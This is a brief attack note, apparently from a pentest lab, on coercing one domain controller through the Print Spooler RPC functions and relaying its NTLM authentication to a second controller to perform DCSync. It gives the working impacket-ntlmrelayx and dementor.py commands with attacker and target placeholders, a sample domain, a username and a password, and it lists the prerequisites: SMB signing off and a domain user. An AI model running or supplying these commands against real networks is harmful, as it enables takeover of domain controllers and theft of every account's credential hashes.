	Desc:
			Use Sprint Spooler service, specific functions: RpcRemoteFindFirstPrinterChangeNotification and RpcRemoteFindFirstPrinterChangeNotificationEx to relay the ntlm hash of a DC01 to DC02 in order to perform DCsync.
		

	 Usage:
		We need SMB signing off on DCs
		impacket-ntlmrelayx -t dcsync://dc2-ip -smb2support
		Relaying to dc02
		python3 ./dementor.py attacker-ip dc1-ip -u bob -d eagle.local -p Slavi123
		we need domain user if attacking from a non domain computer
		
